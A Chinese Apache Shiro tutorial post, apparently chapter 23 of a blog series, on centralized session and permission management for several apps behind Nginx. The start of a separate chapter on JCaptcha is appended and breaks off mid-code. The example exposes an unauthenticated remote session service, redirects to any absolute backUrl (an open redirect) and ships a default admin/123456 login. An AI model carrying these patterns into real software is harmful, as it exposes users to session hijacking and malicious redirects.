学习本章之前，请务必先学习《第十章 会话管理》和《第十六章 综合实例》，本章代码都是基于这两章的代码基础上完成的。
 
本章示例是同域名的场景下完成的，如果跨域请参考《第十五章 单点登录》和《第十七章 OAuth2集成》了解使用CAS或OAuth2实现跨域的身份验证和授权。另外比如客户端/服务器端的安全校验可参考《第二十章 无状态Web应用集成》。
 
 
部署架构 
1、有三个应用：用于用户/权限控制的Server（端口：8080）；两个应用App1（端口9080）和App2（端口10080）；
2、使用Nginx反向代理这三个应用，nginx.conf的server配置部分如下：  
server {
    listen 80;
    server_name  localhost;
    charset utf-8;
    location ~ ^/(chapter23-server)/ {
	    proxy_pass http://127.0.0.1:8080; 
	    index /;
            proxy_set_header Host $host;
    }
    location ~ ^/(chapter23-app1)/ {
	    proxy_pass http://127.0.0.1:9080; 
	    index /;
            proxy_set_header Host $host;
    }
    location ~ ^/(chapter23-app2)/ {
	    proxy_pass http://127.0.0.1:10080; 
	    index /;
            proxy_set_header Host $host;
    }
} 
如访问http://localhost/chapter23-server会自动转发到http://localhost:8080/chapter23-server；
访问http://localhost/chapter23-app1会自动转发到http://localhost:9080/chapter23-app1；访问http://localhost/chapter23-app3会自动转发到http://localhost:10080/chapter23-app3；
 
Nginx的安装及使用请自行搜索学习，本文不再阐述。 
 
项目架构 
1、首先通过用户/权限Server维护用户、应用、权限信息；数据都持久化到MySQL数据库中；
2、应用App1/应用App2使用客户端Client远程调用用户/权限Server获取会话及权限信息。
 
此处使用Mysql存储会话，而不是使用如Memcached/Redis之类的，主要目的是降低学习成本；如果换成如Redis也不会很难；如： 
使用如Redis还一个好处就是无需在用户/权限Server中开会话过期调度器，可以借助Redis自身的过期策略来完成。
 
模块关系依赖
  
1、shiro-example-chapter23-pom模块：提供了其他所有模块的依赖；这样其他模块直接继承它即可，简化依赖配置，如shiro-example-chapter23-server：  
<parent>
    <artifactId>shiro-example-chapter23-pom</artifactId>
    <groupId>com.github.zhangkaitao</groupId>
    <version>1.0-SNAPSHOT</version>
</parent>
2、shiro-example-chapter23-core模块：提供给shiro-example-chapter23-server、shiro-example-chapter23-client、shiro-example-chapter23-app*模块的核心依赖，比如远程调用接口等；
  
3、shiro-example-chapter23-server模块：提供了用户、应用、权限管理功能；
 
4、shiro-example-chapter23-client模块：提供给应用模块获取会话及应用对应的权限信息；
 
5、shiro-example-chapter23-app*模块：各个子应用，如一些内部管理系统应用；其登录都跳到shiro-example-chapter23-server登录；另外权限都从shiro-example-chapter23-server获取（如通过远程调用）。  
  
shiro-example-chapter23-pom模块
 
其pom.xml的packaging类型为pom，并且在该pom中加入其他模块需要的依赖，然后其他模块只需要把该模块设置为parent即可自动继承这些依赖，如shiro-example-chapter23-server模块： 
<parent>
    <artifactId>shiro-example-chapter23-pom</artifactId>
    <groupId>com.github.zhangkaitao</groupId>
    <version>1.0-SNAPSHOT</version>
</parent> 
简化其他模块的依赖配置等。 
 
shiro-example-chapter23-core模块
 
提供了其他模块共有的依赖，如远程调用接口：  
public interface RemoteServiceInterface {
    public Session getSession(String appKey, Serializable sessionId);
    Serializable createSession(Session session);
    public void updateSession(String appKey, Session session);
    public void deleteSession(String appKey, Session session);
    public PermissionContext getPermissions(String appKey, String username);
} 
提供了会话的CRUD，及根据应用key和用户名获取权限上下文（包括角色和权限字符串）；shiro-example-chapter23-server模块服务端实现；shiro-example-chapter23-client模块客户端调用。
 
另外提供了com.github.zhangkaitao.shiro.chapter23.core.ClientSavedRequest，其扩展了org.apache.shiro.web.util.SavedRequest；用于shiro-example-chapter23-app*模块当访问一些需要登录的请求时，自动把请求保存下来，然后重定向到shiro-example-chapter23-server模块登录；登录成功后再重定向回来；因为SavedRequest不保存URL中的schema://domain:port部分；所以才需要扩展SavedRequest；使得ClientSavedRequest能保存schema://domain:port；这样才能从一个应用重定向另一个（要不然只能在一个应用内重定向）：  
    public String getRequestUrl() {
        String requestURI = getRequestURI();
        if(backUrl != null) {//1
            if(backUrl.toLowerCase().startsWith("http://") || backUrl.toLowerCase().startsWith("https://")) {
                return backUrl;
            } else if(!backUrl.startsWith(contextPath)) {//2
                requestURI = contextPath + backUrl;
            } else {//3
                requestURI = backUrl;
            }
        }
        StringBuilder requestUrl = new StringBuilder(scheme);//4
        requestUrl.append("://");
        requestUrl.append(domain);//5
        //6
        if("http".equalsIgnoreCase(scheme) && port != 80) {
            requestUrl.append(":").append(String.valueOf(port));
        } else if("https".equalsIgnoreCase(scheme) && port != 443) {
            requestUrl.append(":").append(String.valueOf(port));
        }
        //7
        requestUrl.append(requestURI);
        //8
        if (backUrl == null && getQueryString() != null) {
            requestUrl.append("?").append(getQueryString());
        }
        return requestUrl.toString();
    }
 
1、如果从外部传入了successUrl（登录成功之后重定向的地址），且以http://或https://开头那么直接返回（相应的拦截器直接重定向到它即可）；
2、如果successUrl有值但没有上下文，拼上上下文；
3、否则，如果successUrl有值，直接赋值给requestUrl即可；否则，如果successUrl没值，那么requestUrl就是当前请求的地址；
5、拼上url前边的schema，如http或https；
6、拼上域名；
7、拼上重定向到的地址（带上下文）；
8、如果successUrl没值，且有查询参数，拼上；
9返回该地址，相应的拦截器直接重定向到它即可。
 
shiro-example-chapter23-server模块
简单的实体关系图  
简单数据字典
用户(sys_user)
名称
类型
长度
描述
id
bigint
 
编号 主键
username
varchar
100
用户名
password
varchar
100
密码
salt
varchar
50
盐
locked
bool
 
账户是否锁定
应用(sys_app)
名称
类型
长度
描述
id
bigint
 
编号 主键
name
varchar
100
应用名称
app_key
varchar
100
应用key（唯一）
app_secret
varchar
100
应用安全码
available
bool
 
是否锁定
授权(sys_authorization)
名称
类型
长度
描述
id
bigint
 
编号 主键
user_id
bigint
 
所属用户
app_id
bigint
 
所属应用
role_ids
varchar
100
角色列表
用户：比《第十六章 综合实例》少了role_ids，因为本章是多项目集中权限管理；所以授权时需要指定相应的应用；而不是直接给用户授权；所以不能在用户中出现role_ids了；
应用：所有集中权限的应用；在此处需要指定应用key(app_key)和应用安全码（app_secret），app在访问server时需要指定自己的app_key和用户名来获取该app对应用户权限信息；另外app_secret可以认为app的密码，比如需要安全访问时可以考虑使用它，可参考《第二十章 无状态Web应用集成》。另外available属性表示该应用当前是否开启；如果false表示该应用当前不可用，即不能获取到相应的权限信息。
授权：给指定的用户在指定的app下授权，即角色是与用户和app存在关联关系。
 
因为本章使用了《第十六章 综合实例》代码，所以还有其他相应的表结构（本章未使用到）。
 
表/数据SQL
具体请参考
sql/ shiro-schema.sql （表结构）
sql/ shiro-data.sql  （初始数据）
 
实体
具体请参考com.github.zhangkaitao.shiro.chapter23.entity包下的实体，此处就不列举了。
 
DAO
具体请参考com.github.zhangkaitao.shiro.chapter23.dao包下的DAO接口及实现。
 
Service
具体请参考com.github.zhangkaitao.shiro.chapter23.service包下的Service接口及实现。以下是出了基本CRUD之外的关键接口： 
public interface AppService {
    public Long findAppIdByAppKey(String appKey);// 根据appKey查找AppId 
}
public interface AuthorizationService {
    //根据AppKey和用户名查找其角色
    public Set<String> findRoles(String appKey, String username);
    //根据AppKey和用户名查找权限字符串
    public Set<String> findPermissions(String appKey, String username);
} 
根据AppKey和用户名查找用户在指定应用中对于的角色和权限字符串。
 
UserRealm  
protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principals) {
    String username = (String)principals.getPrimaryPrincipal();
    SimpleAuthorizationInfo authorizationInfo = new SimpleAuthorizationInfo();
    authorizationInfo.setRoles(
        authorizationService.findRoles(Constants.SERVER_APP_KEY, username));
    authorizationInfo.setStringPermissions(
    authorizationService.findPermissions(Constants.SERVER_APP_KEY, username));
    return authorizationInfo;
} 
此处需要调用AuthorizationService的findRoles/findPermissions方法传入AppKey和用户名来获取用户的角色和权限字符串集合。其他的和《第十六章 综合实例》代码一样。
 
ServerFormAuthenticationFilter 
public class ServerFormAuthenticationFilter extends FormAuthenticationFilter {
    protected void issueSuccessRedirect(ServletRequest request, ServletResponse response) throws Exception {
        String fallbackUrl = (String) getSubject(request, response)
                .getSession().getAttribute("authc.fallbackUrl");
        if(StringUtils.isEmpty(fallbackUrl)) {
            fallbackUrl = getSuccessUrl();
        }
        WebUtils.redirectToSavedRequest(request, response, fallbackUrl);
    }
} 
因为是多项目登录，比如如果是从其他应用中重定向过来的，首先检查Session中是否有“authc.fallbackUrl”属性，如果有就认为它是默认的重定向地址；否则使用Server自己的successUrl作为登录成功后重定向到的地址。
 
MySqlSessionDAO
将会话持久化到Mysql数据库；此处大家可以将其实现为如存储到Redis/Memcached等，实现策略请参考《第十章 会话管理》中的会话存储/持久化章节的MySessionDAO，完全一样。
 
MySqlSessionValidationScheduler
和《第十章 会话管理》中的会话验证章节部分中的MySessionValidationScheduler完全一样。如果使用如Redis之类的有自动过期策略的DB，完全可以不用实现SessionValidationScheduler，直接借助于这些DB的过期策略即可。
 
RemoteService  
public class RemoteService implements RemoteServiceInterface {
    @Autowired  private AuthorizationService authorizationService;
    @Autowired  private SessionDAO sessionDAO;
    public Session getSession(String appKey, Serializable sessionId) {
        return sessionDAO.readSession(sessionId);
    }
    public Serializable createSession(Session session) {
        return sessionDAO.create(session);
    }
    public void updateSession(String appKey, Session session) {
        sessionDAO.update(session);
    }
    public void deleteSession(String appKey, Session session) {
        sessionDAO.delete(session);
    }
    public PermissionContext getPermissions(String appKey, String username) {
        PermissionContext permissionContext = new PermissionContext();
        permissionContext.setRoles(authorizationService.findRoles(appKey, username));
        permissionContext.setPermissions(authorizationService.findPermissions(appKey, username));
        return permissionContext;
    }
} 
将会使用HTTP调用器暴露为远程服务，这样其他应用就可以使用相应的客户端调用这些接口进行Session的集中维护及根据AppKey和用户名获取角色/权限字符串集合。此处没有实现安全校验功能，如果是局域网内使用可以通过限定IP完成；否则需要使用如《第二十章 无状态Web应用集成》中的技术完成安全校验。
 
然后在spring-mvc-remote-service.xml配置文件把服务暴露出去：  
<bean id="remoteService"
  class="com.github.zhangkaitao.shiro.chapter23.remote.RemoteService"/>
<bean name="/remoteService" 
  class="org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter">
    <property name="service" ref="remoteService"/>
    <property name="serviceInterface" 
      value="com.github.zhangkaitao.shiro.chapter23.remote.RemoteServiceInterface"/>
</bean>
   
Shiro配置文件spring-config-shiro.xml 
和《第十六章 综合实例》配置类似，但是需要在shiroFilter中的filterChainDefinitions中添加如下配置，即远程调用不需要身份认证：  
/remoteService = anon
对于userRealm的缓存配置直接禁用；因为如果开启，修改了用户权限不会自动同步到缓存；另外请参考《第十一章 缓存机制》进行缓存的正确配置。
 
服务器端数据维护
1、首先开启ngnix反向代理；然后就可以直接访问http://localhost/chapter23-server/；
2、输入默认的用户名密码：admin/123456登录
3、应用管理，进行应用的CRUD，主要维护应用KEY（必须唯一）及应用安全码；客户端就可以使用应用KEY获取用户对应应用的权限了。 
4、授权管理，维护在哪个应用中用户的角色列表。这样客户端就可以根据应用KEY及用户名获取到对应的角色/权限字符串列表了。 
 
shiro-example-chapter23-client模块
Client模块提供给其他应用模块依赖，这样其他应用模块只需要依赖Client模块，然后再在相应的配置文件中配置如登录地址、远程接口地址、拦截器链等等即可，简化其他应用模块的配置。
 
配置远程服务spring-client-remote-service.xml      
<bean id="remoteService" 
  class="org.springframework.remoting.httpinvoker.HttpInvokerProxyFactoryBean">
    <property name="serviceUrl" value="${client.remote.service.url}"/>
    <property name="serviceInterface" 
      value="com.github.zhangkaitao.shiro.chapter23.remote.RemoteServiceInterface"/>
</bean> 
client.remote.service.url是远程服务暴露的地址；通过相应的properties配置文件配置，后续介绍。然后就可以通过remoteService获取会话及角色/权限字符串集合了。
 
ClientRealm  
public class ClientRealm extends AuthorizingRealm {
    private RemoteServiceInterface remoteService;
    private String appKey;
    public void setRemoteService(RemoteServiceInterface remoteService) {
        this.remoteService = remoteService;
    }
    public void setAppKey(String appKey) {
        this.appKey = appKey;
    }
    protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principals) {
        String username = (String) principals.getPrimaryPrincipal();
        SimpleAuthorizationInfo authorizationInfo = new SimpleAuthorizationInfo();
        PermissionContext context = remoteService.getPermissions(appKey, username);
        authorizationInfo.setRoles(context.getRoles());
        authorizationInfo.setStringPermissions(context.getPermissions());
        return authorizationInfo;
    }
    protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token) throws AuthenticationException {
        //永远不会被调用
        throw new UnsupportedOperationException("永远不会被调用");
    }
} 
ClientRealm提供身份认证信息和授权信息，此处因为是其他应用依赖客户端，而这些应用不会实现身份认证，所以doGetAuthenticationInfo获取身份认证信息直接无须实现。另外获取授权信息，是通过远程暴露的服务RemoteServiceInterface获取，提供appKey和用户名获取即可。
 
ClientSessionDAO 
public class ClientSessionDAO extends CachingSessionDAO {
    private RemoteServiceInterface remoteService;
    private String appKey;
    public void setRemoteService(RemoteServiceInterface remoteService) {
        this.remoteService = remoteService;
    }
    public void setAppKey(String appKey) {
        this.appKey = appKey;
    }
    protected void doDelete(Session session) {
        remoteService.deleteSession(appKey, session);
    }
    protected void doUpdate(Session session) {
        remoteService.updateSession(appKey, session);
}
protected Serializable doCreate(Session session) {
        Serializable sessionId = remoteService.createSession(session);
        assignSessionId(session, sessionId);
        return sessionId;
    }
    protected Session doReadSession(Serializable sessionId) {
        return remoteService.getSession(appKey, sessionId);
    }
} 
Session的维护通过远程暴露接口实现，即本地不维护会话。
 
ClientAuthenticationFilter  
public class ClientAuthenticationFilter extends AuthenticationFilter {
    protected boolean isAccessAllowed(ServletRequest request, ServletResponse response, Object mappedValue) {
        Subject subject = getSubject(request, response);
        return subject.isAuthenticated();
    }
    protected boolean onAccessDenied(ServletRequest request, ServletResponse response) throws Exception {
        String backUrl = request.getParameter("backUrl");
        saveRequest(request, backUrl, getDefaultBackUrl(WebUtils.toHttp(request)));
        return false;
    }
    protected void saveRequest(ServletRequest request, String backUrl, String fallbackUrl) {
        Subject subject = SecurityUtils.getSubject();
        Session session = subject.getSession();
        HttpServletRequest httpRequest = WebUtils.toHttp(request);
        session.setAttribute("authc.fallbackUrl", fallbackUrl);
        SavedRequest savedRequest = new ClientSavedRequest(httpRequest, backUrl);
        session.setAttribute(WebUtils.SAVED_REQUEST_KEY, savedRequest);
}
    private String getDefaultBackUrl(HttpServletRequest request) {
        String scheme = request.getScheme();
        String domain = request.getServerName();
        int port = request.getServerPort();
        String contextPath = request.getContextPath();
        StringBuilder backUrl = new StringBuilder(scheme);
        backUrl.append("://");
        backUrl.append(domain);
        if("http".equalsIgnoreCase(scheme) && port != 80) {
            backUrl.append(":").append(String.valueOf(port));
        } else if("https".equalsIgnoreCase(scheme) && port != 443) {
            backUrl.append(":").append(String.valueOf(port));
        }
        backUrl.append(contextPath);
        backUrl.append(getSuccessUrl());
        return backUrl.toString();
    }
} 
ClientAuthenticationFilter是用于实现身份认证的拦截器（authc），当用户没有身份认证时；
1、首先得到请求参数backUrl，即登录成功重定向到的地址；
2、然后保存保存请求到会话，并重定向到登录地址（server模块）；
3、登录成功后，返回地址按照如下顺序获取：backUrl、保存的当前请求地址、defaultBackUrl（即设置的successUrl）；
 
ClientShiroFilterFactoryBean  
public class ClientShiroFilterFactoryBean extends ShiroFilterFactoryBean implements ApplicationContextAware {
    private ApplicationContext applicationContext;
    public void setApplicationContext(ApplicationContext applicationContext) {
        this.applicationContext = applicationContext;
    }
    public void setFiltersStr(String filters) {
        if(StringUtils.isEmpty(filters)) {
            return;
        }
        String[] filterArray = filters.split(";");
        for(String filter : filterArray) {
            String[] o = filter.split("=");
            getFilters().put(o[0], (Filter)applicationContext.getBean(o[1]));
        }
    }
    public void setFilterChainDefinitionsStr(String filterChainDefinitions) {
        if(StringUtils.isEmpty(filterChainDefinitions)) {
            return;
        }
        String[] chainDefinitionsArray = filterChainDefinitions.split(";");
        for(String filter : chainDefinitionsArray) {
            String[] o = filter.split("=");
            getFilterChainDefinitionMap().put(o[0], o[1]);
        }
    }
} 
1、setFiltersStr：设置拦截器，设置格式如“filterName=filterBeanName; filterName=filterBeanName”；多个之间分号分隔；然后通过applicationContext获取filterBeanName对应的Bean注册到拦截器Map中；
2、setFilterChainDefinitionsStr：设置拦截器链，设置格式如“url=filterName1[config],filterName2; url=filterName1[config],filterName2”；多个之间分号分隔；
 
Shiro客户端配置spring-client.xml
提供了各应用通用的Shiro客户端配置；这样应用只需要导入相应该配置即可完成Shiro的配置，简化了整个配置过程。  
<context:property-placeholder location= 
    "classpath:client/shiro-client-default.properties,classpath:client/shiro-client.properties"/> 
提供给客户端配置的properties属性文件，client/shiro-client-default.properties是客户端提供的默认的配置；classpath:client/shiro-client.properties是用于覆盖客户端默认配置，各应用应该提供该配置文件，然后提供各应用个性配置。
 
<bean id="remoteRealm" class="com.github.zhangkaitao.shiro.chapter23.client.ClientRealm">
    <property name="cachingEnabled" value="false"/>
    <property name="appKey" value="${client.app.key}"/>
    <property name="remoteService" ref="remoteService"/>
</bean> 
appKey：使用${client.app.key}占位符替换，即需要在之前的properties文件中配置。 
 
<bean id="sessionIdCookie" class="org.apache.shiro.web.servlet.SimpleCookie">
    <constructor-arg value="${client.session.id}"/>
    <property name="httpOnly" value="true"/>
    <property name="maxAge" value="-1"/>
    <property name="domain" value="${client.cookie.domain}"/>
    <property name="path" value="${client.cookie.path}"/>
</bean> 
Session Id Cookie，cookie名字、域名、路径等都是通过配置文件配置。  
 
<bean id="sessionDAO" 
  class="com.github.zhangkaitao.shiro.chapter23.client.ClientSessionDAO">
    <property name="sessionIdGenerator" ref="sessionIdGenerator"/>
    <property name="appKey" value="${client.app.key}"/>
    <property name="remoteService" ref="remoteService"/>
</bean> 
SessionDAO的appKey，也是通过${ client.app.key }占位符替换，需要在配置文件配置。
 
<bean id="sessionManager" 
  class="org.apache.shiro.web.session.mgt.DefaultWebSessionManager">
        <property name="sessionValidationSchedulerEnabled" value="false"/>//省略其他
</bean> 
其他应用无须进行会话过期调度，所以sessionValidationSchedulerEnabled=false。  
 
<bean id="clientAuthenticationFilter" 
  class="com.github.zhangkaitao.shiro.chapter23.client.ClientAuthenticationFilter"/> 
应用的身份认证使用ClientAuthenticationFilter，即如果没有身份认证，则会重定向到Server模块完成身份认证，身份认证成功后再重定向回来。 
 
<bean id="shiroFilter" 
  class="com.github.zhangkaitao.shiro.chapter23.client.ClientShiroFilterFactoryBean">
    <property name="securityManager" ref="securityManager"/>
    <property name="loginUrl" value="${client.login.url}"/>
    <property name="successUrl" value="${client.success.url}"/>
    <property name="unauthorizedUrl" value="${client.unauthorized.url}"/>
    <property name="filters">
        <util:map>
            <entry key="authc" value-ref="clientAuthenticationFilter"/>
        </util:map>
    </property>
    <property name="filtersStr" value="${client.filters}"/>
    <property name="filterChainDefinitionsStr" value="${client.filter.chain.definitions}"/>
</bean> 
ShiroFilter使用我们自定义的ClientShiroFilterFactoryBean，然后loginUrl（登录地址）、successUrl（登录成功后默认的重定向地址）、unauthorizedUrl（未授权重定向到的地址）通过占位符替换方式配置；另外filtersStr和filterChainDefinitionsStr也是使用占位符替换方式配置；这样就可以在各应用进行自定义了。
 
默认配置client/ shiro-client-default.properties 
#各应用的appKey
client.app.key=
#远程服务URL地址
client.remote.service.url=http://localhost/chapter23-server/remoteService
#登录地址
client.login.url=http://localhost/chapter23-server/login
#登录成功后，默认重定向到的地址
client.success.url=/
#未授权重定向到的地址
client.unauthorized.url=http://localhost/chapter23-server/unauthorized
#session id 域名
client.cookie.domain=
#session id 路径
client.cookie.path=/
#cookie中的session id名称
client.session.id=sid
#cookie中的remember me名称
client.rememberMe.id=rememberMe
#过滤器 name=filter-ref;name=filter-ref
client.filters=
#过滤器链 格式 url=filters;url=filters
client.filter.chain.definitions=/**=anon 
在各应用中主要配置client.app.key、client.filters、client.filter.chain.definitions。
 
 
shiro-example-chapter23-app*模块
继承shiro-example-chapter23-pom模块 
<parent>
    <artifactId>shiro-example-chapter23-pom</artifactId>
    <groupId>com.github.zhangkaitao</groupId>
    <version>1.0-SNAPSHOT</version>
</parent>
  
依赖shiro-example-chapter23-client模块
<dependency>
    <groupId>com.github.zhangkaitao</groupId>
    <artifactId>shiro-example-chapter23-client</artifactId>
    <version>1.0-SNAPSHOT</version>
</dependency> 
 
客户端配置client/shiro-client.properties
 
配置shiro-example-chapter23-app1  
client.app.key=645ba612-370a-43a8-a8e0-993e7a590cf0
client.success.url=/hello
client.filter.chain.definitions=/hello=anon;/login=authc;/**=authc 
client.app.key是server模块维护的，直接拷贝过来即可；client.filter.chain.definitions定义了拦截器链；比如访问/hello，匿名即可。
 
配置shiro-example-chapter23-app2 
client.app.key=645ba613-370a-43a8-a8e0-993e7a590cf0
client.success.url=/hello
client.filter.chain.definitions=/hello=anon;/login=authc;/**=authc 
和app1类似，client.app.key是server模块维护的，直接拷贝过来即可；client.filter.chain.definitions定义了拦截器链；比如访问/hello，匿名即可。
 
web.xml 
<context-param>
    <param-name>contextConfigLocation</param-name>
    <param-value>
        classpath:client/spring-client.xml
    </param-value>
</context-param>
<listener>
    <listener-class>
        org.springframework.web.context.ContextLoaderListener
    </listener-class>
</listener> 
指定加载客户端Shiro配置，client/spring-client.xml。 
 
<filter>
    <filter-name>shiroFilter</filter-name>
    <filter-class>org.springframework.web.filter.DelegatingFilterProxy</filter-class>
    <init-param>
        <param-name>targetFilterLifecycle</param-name>
        <param-value>true</param-value>
    </init-param>
</filter>
<filter-mapping>
    <filter-name>shiroFilter</filter-name>
    <url-pattern>/*</url-pattern>
</filter-mapping>
 配置ShiroFilter拦截器。
 
控制器
shiro-example-chapter23-app1
@Controller
public class HelloController {
    @RequestMapping("/hello")
    public String hello() {
        return "success";
    }
    @RequestMapping(value = "/attr", method = RequestMethod.POST)
    public String setAttr(
            @RequestParam("key") String key, @RequestParam("value") String value) {
        SecurityUtils.getSubject().getSession().setAttribute(key, value);
        return "success";
    }
    @RequestMapping(value = "/attr", method = RequestMethod.GET)
    public String getAttr(
            @RequestParam("key") String key, Model model) {
        model.addAttribute("value", 
            SecurityUtils.getSubject().getSession().getAttribute(key));
        return "success";
    }
    @RequestMapping("/role1")
    @RequiresRoles("role1")
    public String role1() {
        return "success";
    }
} 
shiro-example-chapter23-app2的控制器类似，role2方法使用@RequiresRoles("role2")注解，即需要角色2。
 
其他配置请参考源码。 
 
 
测试
1、安装配置启动nginx
1、首先到http://nginx.org/en/download.html下载，比如我下载的是windows版本的；
 
2、然后编辑conf/nginx.conf配置文件，在server部分添加如下部分：
    location ~ ^/(chapter23-server)/ {
	    proxy_pass http://127.0.0.1:8080; 
	    index /;
            proxy_set_header Host $host;
    }
    location ~ ^/(chapter23-app1)/ {
	    proxy_pass http://127.0.0.1:9080; 
	    index /;
            proxy_set_header Host $host;
    }
    location ~ ^/(chapter23-app2)/ {
	    proxy_pass http://127.0.0.1:10080; 
	    index /;
            proxy_set_header Host $host;
    }
  
3、最后双击nginx.exe启动Nginx即可。
 
已经配置好的nginx请到shiro-example-chapter23-nginx模块下下周nginx-1.5.11.rar即可。
 
2、安装依赖
1、首先安装shiro-example-chapter23-core依赖，到shiro-example-chapter23-core模块下运行mvn install安装core模块。
2、接着到shiro-example-chapter23-client模块下运行mvn install安装客户端模块。
 
3、启动Server模块
到shiro-example-chapter23-server模块下运行mvn jetty:run启动该模块；使用http://localhost:8080/chapter23-server/即可访问，因为启动了nginx，那么可以直接访问http://localhost/chapter23-server/。
 
4、启动App*模块
到shiro-example-chapter23-app1和shiro-example-chapter23-app2模块下分别运行mvn jetty:run启动该模块；使用http://localhost:9080/chapter23-app1/和http://localhost:10080/chapter23-app2/即可访问，因为启动了nginx，那么可以直接访问http://localhost/chapter23-app1/和http://localhost/chapter23-app2/。
5、服务器端维护
1、访问http://localhost/chapter23-server/；
2、输入默认的用户名密码：admin/123456登录
 
3、应用管理，进行应用的CRUD，主要维护应用KEY（必须唯一）及应用安全码；客户端就可以使用应用KEY获取用户对应应用的权限了。
4、授权管理，维护在哪个应用中用户的角色列表。这样客户端就可以根据应用KEY及用户名获取到对应的角色/权限字符串列表了。  
6、App*模块身份认证及授权
1、在未登录情况下访问http://localhost/chapter23-app1/hello，看到下图： 2、登录地址是http://localhost/chapter23-app1/login?backUrl=/chapter23-app1，即登录成功后重定向回http://localhost/chapter23-app1（这是个错误地址，为了测试登录成功后重定向地址），点击登录按钮后重定向到Server模块的登录界面： 
3、登录成功后，会重定向到相应的登录成功地址；接着访问http://localhost/chapter23-app1/hello，看到如下图：
4、可以看到admin登录，及其是否拥有role1/role2角色；可以在server模块移除role1角色或添加role2角色看看页面变化；
 
5、可以在http://localhost/chapter23-app1/hello页面设置属性，如key=123；接着访问http://localhost/chapter23-app2/attr?key=key就可以看到刚才设置的属性，如下图：
另外在app2，用户默认拥有role2角色，而没有role1角色。
 
到此整个测试就完成了，可以看出本示例实现了：会话的分布式及权限的集中管理。
 
本示例缺点
1、没有加缓存；
2、客户端每次获取会话/权限都需要通过客户端访问服务端；造成服务端单点和请求压力大；单点可以考虑使用集群来解决；请求压力大需要考虑配合缓存服务器（如Redis）来解决；即每次会话/权限获取时首先查询缓存中是否存在，如果有直接获取即可；否则再查服务端；降低请求压力；
3、会话的每次更新（比如设置属性/更新最后访问时间戳）都需要同步到服务端；也造成了请求压力过大；可以考虑在请求的最后只同步一次会话（需要对Shiro会话进行改造，通过如拦截器在执行完请求后完成同步，这样每次请求只同步一次）；
4、只能同域名才能使用，即会话ID是从同一个域名下获取，如果跨域请考虑使用CAS/OAuth2之实现。
 
所以实际应用时可能还是需要改造的，但大体思路是差不多的。
   
 
 
示例源代码：https://github.com/zhangkaitao/shiro-example；可加群 231889722 探讨Spring/Shiro技术。
        
  
已有 2 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
第二十二章 集成验证码——《跟我学Shiro》, jinnianshilongnian.iteye.com.blog.2046041, Tue, 15 Apr 2014 08:19:29 +0800

 
目录贴： 跟我学Shiro目录贴
 
在做用户登录功能时，很多时候都需要验证码支持，验证码的目的是为了防止机器人模拟真实用户登录而恶意访问，如暴力破解用户密码/恶意评论等。目前也有一些验证码比较简单，通过一些OCR工具就可以解析出来；另外还有一些验证码比较复杂（一般通过如扭曲、加线条/噪点等干扰）防止OCR工具识别；但是在中国就是人多，机器干不了的可以交给人来完成，所以在中国就有很多打码平台，人工识别验证码；因此即使比较复杂的如填字、算数等类型的验证码还是能识别的。所以验证码也不是绝对可靠的，目前比较可靠还是手机验证码，但是对于用户来说相对于验证码还是比较麻烦的。
 
对于验证码图片的生成，可以自己通过如Java提供的图像API自己去生成，也可以借助如JCaptcha这种开源Java类库生成验证码图片；JCaptcha提供了常见的如扭曲、加噪点等干扰支持。本章代码基于《第十六章 综合实例》。
 
一、添加JCaptcha依赖 
<dependency>
    <groupId>com.octo.captcha</groupId>
    <artifactId>jcaptcha</artifactId>
    <version>2.0-alpha-1</version>
</dependency>
<dependency>
    <groupId>com.octo.captcha</groupId>
    <artifactId>jcaptcha-integration-simple-servlet</artifactId>
    <version>2.0-alpha-1</version>
    <exclusions>
        <exclusion>
            <artifactId>servlet-api</artifactId>
            <groupId>javax.servlet</groupId>
        </exclusion>
    </exclusions>
</dependency> 
com.octo.captcha . jcaptcha 提供了jcaptcha 核心；而jcaptcha-integration-simple-servlet提供了与Servlet集成。
 
二、GMailEngine
来自https://code.google.com/p/musicvalley/source/browse/trunk/musicvalley/doc/springSecurity/springSecurityIII/src/main/java/com/spring/security/jcaptcha/GMailEngine.java?spec=svn447&r=447（目前无法访问了），仿照JCaptcha2.0编写类似GMail验证码的样式；具体请参考com.github.zhangkaitao.shiro.chapter22.jcaptcha.GMailEngine。
 
三、MyManageableImageCaptchaService
提供了判断仓库中是否有相应的验证码存在。 
public class MyManageableImageCaptchaService extends 
  DefaultManageableImageCaptchaService { 
    public MyManageableImageCaptchaService(
      com.octo.captcha.service.captchastore.CaptchaStore captchaStore,      
      com.octo.captcha.engine.CaptchaEngine captchaEngine,
      int minGuarantedStorageDelayInSeconds, 
      int maxCaptchaStoreSize, 
      int captchaStoreLoadBeforeGarbageCollection) {
        super(captchaStore, captchaEngine, minGuarantedStorageDelayInSeconds, 
            maxCaptchaStoreSize, captchaStoreLoadBeforeGarbageCollection);
    }
    public boolean hasCapcha(String id, String userCaptchaResponse) {
        return store.getCaptcha(id).validateResponse(userCaptchaResponse);
    }
}
  
 
四、JCaptcha工具类
提供相应的API来验证当前请求输入的验证码是否正确。  
public class JCaptcha {
    public static final MyManageableImageCaptchaService captchaService
            = new MyManageableImageCaptchaService(new FastHashMapCaptchaStore(), 
                            new GMailEngine(), 180, 100000, 75000);
    public static boolean validateResponse(
        HttpServletRequest request, String userCaptchaResponse) {
        if (request.getSession(false) == null) return false;
        boolean validated = false;
        try {
            String id = request.getSession().getId();
            validated = 
                captchaService.validateResponseForID(id, userCaptchaResponse)
                            .booleanValue();
        } catch (CaptchaServiceException e) {
            e.printStackTrace();
        }
        return validated;
    } 
    public static boolean hasCaptcha(
        HttpServletRequest request, String userCaptchaResponse) {
        if (request.getSession(false) == null) return false;
        boolean validated = false;
        try {
            String id = request.getSession().getId();
            validated = captchaService.hasCapcha(id, userCaptchaResponse);
        } catch (CaptchaServiceException e) {
            e.printStackTrace();
        }
        return validated;
    }
} 
validateResponse()：验证当前请求输入的验证码否正确；并从CaptchaService中删除已经生成的验证码；
hasCaptcha()：验证当前请求输入的验证码是否正确；但不从CaptchaService中删除已经生成的验证码（比如Ajax验证时可以使用，防止多次生成验证码）；
 
五、JCaptchaFilter
用于生成验证码图片的过滤器。  
public class JCaptchaFilter extends OncePerRequestFilter {
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain) throws ServletException, IOException {
        response.setDateHeader("Expires", 0L);
